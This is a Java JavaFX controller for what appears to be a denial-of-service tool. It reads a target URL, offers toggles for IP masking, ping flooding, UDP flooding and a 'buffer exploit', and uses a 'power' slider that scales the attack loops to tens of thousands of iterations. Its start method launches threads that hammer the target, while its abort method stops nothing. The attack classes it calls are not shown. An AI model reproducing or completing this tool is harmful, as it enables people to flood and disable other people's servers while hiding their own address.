package sample;

import com.jfoenix.controls.JFXButton;
import com.jfoenix.controls.JFXSlider;
import com.jfoenix.controls.JFXTextField;
import com.jfoenix.controls.JFXToggleButton;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.TextArea;
import java.io.IOException;
import java.net.*;

public class Controller {

    static int port = 2000;
    static InetAddress ip;

    @FXML
    private JFXButton startb, abortb;
    @FXML
    private JFXToggleButton masksIP, bufferexploit, udp, pingtype ;

    @FXML
    private JFXTextField urlField;

    @FXML
    private TextArea detailDisplay;

    @FXML
    private JFXSlider powerslider;


    protected boolean UsesBufferExploit = false, UsesPingType = false,
            UsesRecursiveGet = false, UsesUDPProtocol = false;

    @FXML
    public void togglesMaskIP(ActionEvent event){
        if(masksIP.isSelected()){
            try {
                MaskIP.masks();
            } catch (IOException e) {
                e.printStackTrace();
                detailDisplay.appendText("Failed to mask IP. Please refer to the stack trace for more details.");
}
        }
                else {
                try {
                MaskIP.unmasks();
                } catch (IOException e) {
                e.printStackTrace();
                detailDisplay.setText("Failed to unmask IP. Please refer to the stack trace for more details.");
                }
                }
                }

        @FXML
        public void BufferExploitToggle(){
             if(bufferexploit.isSelected()){
                    UsesBufferExploit = true;
             }
             else {
                    UsesBufferExploit = false;
            }
        }

@FXML
    public void UDPProtocolToggle(){
        if(udp.isSelected()){
            UsesUDPProtocol = true;
        }
        else {
            UsesUDPProtocol = false;
        }
    }

    @FXML
    public void PingTypeToggle(){
        if(pingtype.isSelected()){
            UsesPingType = true;
        }
        else{
            UsesPingType = false;
        }
    }

    @FXML
    public void SingleTypeToggle() {
        if (pingtype.isSelected()) {
            UsesRecursiveGet = true;
        }
    }

    public void StartAllSpecifiedProcesses() throws UnknownHostException {
        String url = urlField.getText();

        detailDisplay.appendText(url + "\n");
        detailDisplay.appendText(String.valueOf(InetAddress.getByName(url) + "\n"));

        int powerval = ((int) powerslider.getValue()) * 10000;

        detailDisplay.appendText("Starting configured processes. \n");

        Thread pingthread = new Thread(() -> {
            if(UsesPingType){
                PingAttack pingAttack = new PingAttack(url, powerval );
                Thread pinger = new Thread(pingAttack);
                pinger.start();
        }
    });

    Thread udpattack = new Thread(() -> {
        if(UsesUDPProtocol){
                    try {
                        for(int i = 0 ; i < powerval ; i++){
                            UDPType.udpattack(url);}
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
        });

        Thread bufferexploitthread = new Thread(() -> {
            if(UsesBufferExploit){
                for(int i = 0 ; i < powerval ; i++){
                    try {
                        BufferExploit.SendStringLooped(url);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
        }});

        pingthread.start();
        udpattack.start();
        bufferexploitthread.start();

    }

    public void AbortsAllProcesses(){
        detailDisplay.appendText("Ending configured processes. \n");




    }
}
